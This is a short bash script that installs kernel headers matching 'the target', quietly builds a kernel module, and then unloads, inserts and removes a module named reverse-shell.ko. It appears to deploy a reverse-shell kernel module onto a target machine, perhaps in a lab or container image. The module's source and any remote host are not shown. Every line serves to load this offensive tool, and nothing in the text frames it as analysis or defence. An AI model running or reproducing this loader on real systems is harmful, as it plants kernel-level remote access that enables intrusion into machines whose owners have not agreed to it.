#!/bin/bash
apt -qq install linux-headers-$(uname -r) -y #by installing in the script, the linux-headers will install with the version of the target, no the machine the image was built on
make > /dev/null #reduces the output of make command
if lsmod | grep -o -q "reverse_shell"; then rmmod reverse-shell; fi
insmod reverse-shell.ko
rmmod reverse-shell